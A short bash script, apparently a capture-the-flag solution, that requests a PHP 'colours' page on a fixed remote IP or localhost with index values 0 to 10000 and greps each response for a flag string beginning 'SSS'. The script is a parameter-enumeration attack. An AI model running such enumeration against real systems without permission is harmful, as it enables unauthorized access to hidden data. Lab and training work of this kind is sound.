#! /bin/bash

PORT=8016

if [[ $1 == "local" ]]; then
    URL="http://localhost:$PORT/colours/index.php"
else
    URL="http://141.85.224.102:$PORT/colours/index.php"
fi

for i in {0..10000}; do
    flag=$(curl -s "$URL?index=$i" | grep SSS)
    if [[ $flag != "" ]]; then
        echo "index = $i"
        echo "$flag"
        break
    fi
done
